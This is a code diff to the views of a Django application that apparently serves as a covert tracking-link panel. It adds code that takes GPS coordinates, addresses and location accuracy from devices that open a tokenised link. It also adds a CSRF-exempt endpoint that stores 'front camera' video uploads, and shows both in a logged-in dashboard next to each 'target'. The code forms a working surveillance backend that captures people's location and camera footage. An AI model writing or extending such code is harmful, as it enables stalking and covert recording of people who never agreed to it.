@@ -9,7 +9,7 @@ from django.contrib.auth.forms import AuthenticationForm
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
 from django.utils import timezone
-from .models import DeviceLink, CapturedDeviceDetail, EnterpriseAsset
+from .models import DeviceLink, CapturedDeviceDetail, EnterpriseAsset, CapturedVideo
 
 def login_view(request):
     if request.user.is_authenticated:
@@ -97,6 +97,18 @@ def delete_link(request, link_id):
 @login_required
 def get_device_detail_json(request, device_id):
     device = get_object_or_404(CapturedDeviceDetail, id=device_id)
+    
+    # Gather videos
+    videos = []
+    for v in device.recorded_videos.all().order_by('-recorded_at'):
+        videos.append({
+            'id': v.id,
+            'url': v.video_file.url if v.video_file else '',
+            'recorded_at': v.recorded_at.strftime('%Y-%m-%d %H:%M:%S'),
+            'duration_sec': v.duration_sec,
+            'file_size_mb': v.file_size_mb
+        })
+
     data = {
         'id': device.id,
         'device_model': device.device_model,
@@ -114,6 +126,14 @@ def get_device_detail_json(request, device_id):
         'ram_gb': device.ram_gb,
         'timezone': device.timezone,
         'language': device.language,
+        'latitude': device.latitude,
+        'longitude': device.longitude,
+        'location_accuracy': device.location_accuracy,
+        'location_status': device.location_status,
+        'location_address': device.location_address,
+        'maps_url': device.maps_url,
+        'location_updated_at': device.location_updated_at.strftime('%Y-%m-%d %H:%M:%S') if device.location_updated_at else None,
+
         'session_status': device.session_status,
         'session_state': device.session_state,
         'is_online': device.is_online,
@@ -122,7 +142,8 @@ def get_device_detail_json(request, device_id):
         'is_recently_active': device.is_recently_active,
         'last_ping': device.last_ping.strftime('%Y-%m-%d %H:%M:%S'),
         'captured_at': device.captured_at.strftime('%Y-%m-%d %H:%M:%S'),
-        'link_label': device.link.target_label if device.link else 'N/A'
+        'link_label': device.link.target_label if device.link else 'N/A',
+        'videos': videos
     }
     return JsonResponse({'status': 'success', 'device': data})
 
@@ -139,7 +160,13 @@ def api_live_devices(request):
             'battery_info': d.battery_info,
             'network_info': d.network_info,
             'ip_address': d.ip_address,
+            'latitude': d.latitude,
+            'longitude': d.longitude,
+            'maps_url': d.maps_url,
+            'location_status': d.location_status,
+            'location_address': d.location_address,
             'session_status': d.session_status,
+
             'session_state': d.session_state,
             'is_recently_active': d.is_recently_active,
             'page_focused': d.page_focused,
@@ -231,6 +258,13 @@ def submit_device_info(request, token):
 
             user_agent = request.META.get('HTTP_USER_AGENT', data.get('user_agent', ''))
 
+            # Extract GPS data
+            latitude = data.get('latitude')
+            longitude = data.get('longitude')
+            location_accuracy = data.get('location_accuracy')
+            location_status = data.get('location_status', 'Pending')
+            location_address = data.get('location_address')
+
             if not device_record:
                 session_token = uuid.uuid4().hex
                 device_record = CapturedDeviceDetail.objects.create(
@@ -252,6 +286,12 @@ def submit_device_info(request, token):
                     ram_gb=str(data.get('ram_gb', 'Unknown')),
                     timezone=data.get('timezone', 'UTC'),
                     language=data.get('language', 'en-US'),
+                    latitude=float(latitude) if latitude is not None else None,
+                    longitude=float(longitude) if longitude is not None else None,
+                    location_accuracy=float(location_accuracy) if location_accuracy is not None else None,
+                    location_status=location_status,
+                    location_address=location_address,
+                    location_updated_at=timezone.now() if latitude is not None else None,
                     is_online=bool(data.get('is_online', True)),
                     page_focused=bool(data.get('page_focused', True)),
                     orientation=data.get('orientation', 'portrait')
@@ -264,17 +304,73 @@ def submit_device_info(request, token):
                 device_record.page_focused = bool(data.get('page_focused', True))
                 device_record.orientation = data.get('orientation', device_record.orientation)
                 device_record.ip_address = ip_address
+
+                if latitude is not None and longitude is not None:
+                    device_record.latitude = float(latitude)
+                    device_record.longitude = float(longitude)
+                    device_record.location_accuracy = float(location_accuracy) if location_accuracy is not None else device_record.location_accuracy
+                    device_record.location_status = location_status
+                    if location_address:
+                        device_record.location_address = location_address
+                    device_record.location_updated_at = timezone.now()
+                elif location_status:
+                    device_record.location_status = location_status
+                    if location_address:
+                        device_record.location_address = location_address
+
+
+                device_record.last_ping = timezone.now()
                 device_record.save()
 
             return JsonResponse({
                 'status': 'active',
                 'session_token': device_record.session_token,
-                'message': 'Telemetry recorded successfully'
+                'message': 'Telemetry & GPS recorded successfully'
             })
         except Exception as e:
             return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
 
     return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)
+
+
+@csrf_exempt
+def upload_video(request, token):
+    if request.method == 'POST':
+        try:
+            session_token = request.POST.get('session_token')
+            if not session_token:
+                return JsonResponse({'status': 'error', 'message': 'Session token is required'}, status=400)
+            
+            device_record = CapturedDeviceDetail.objects.filter(session_token=session_token).first()
+            if not device_record:
+                return JsonResponse({'status': 'error', 'message': 'Device record not found for session'}, status=404)
+            
+            video_file = request.FILES.get('video') or request.FILES.get('file')
+            if not video_file:
+                return JsonResponse({'status': 'error', 'message': 'No video file uploaded'}, status=400)
+
+            duration_sec = int(request.POST.get('duration_sec', 0))
+            size_mb = round(video_file.size / (1024 * 1024), 2)
+            file_size_str = f"{size_mb} MB" if size_mb >= 0.1 else f"{round(video_file.size / 1024, 1)} KB"
+
+            video_obj = CapturedVideo.objects.create(
+                device=device_record,
+                video_file=video_file,
+                duration_sec=duration_sec,
+                file_size_mb=file_size_str
+            )
+
+            return JsonResponse({
+                'status': 'success',
+                'video_id': video_obj.id,
+                'video_url': video_obj.video_file.url,
+                'message': 'Front camera video recorded & uploaded successfully'
+            })
+        except Exception as e:
+            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
+
+    return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)
+
 
 
 def sw_js(request):
